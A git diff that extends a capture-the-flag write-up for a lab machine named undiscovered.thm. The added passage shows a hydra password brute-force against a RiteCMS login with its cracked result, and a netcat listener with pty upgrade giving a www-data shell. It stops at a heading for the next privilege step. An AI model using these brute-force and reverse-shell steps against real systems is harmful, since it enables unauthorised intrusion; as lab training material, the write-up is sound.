@@ -102,6 +102,8 @@ $ cat /etc/hosts
 192.168.1.5 deliver.undiscovered.thm
 ```
 
+## Shell as www-data
+
 Now we can see the admin panel under `/cms`:
 
 ![](https://i.imgur.com/FINKQFM.png)
@@ -119,3 +121,35 @@ RiteCMS 2.2.1 - Authenticated Remote Code Execution                  | https://w
 ```
 
 Second one seems perfect, but we need creds. Tried default username/password `admin:admin` but didn't work. Let's fire up hydra!
+
+```
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong"
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong
+[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
+```
+
+& we're in as `admin:liverpool` follow my steps for shell upload:
+
+![](https://i.imgur.com/OJnp4pH.png)
+
+![](https://i.imgur.com/w5qgPOD.png)
+
+![](https://i.imgur.com/xlopYfo.png)
+
+![](https://i.imgur.com/leifpNg.png)
+
+```
+$ nc -lvp 5555
+listening on [any] 5555 ...
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@undiscovered:/$ whoami;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## Shell as william
+
+
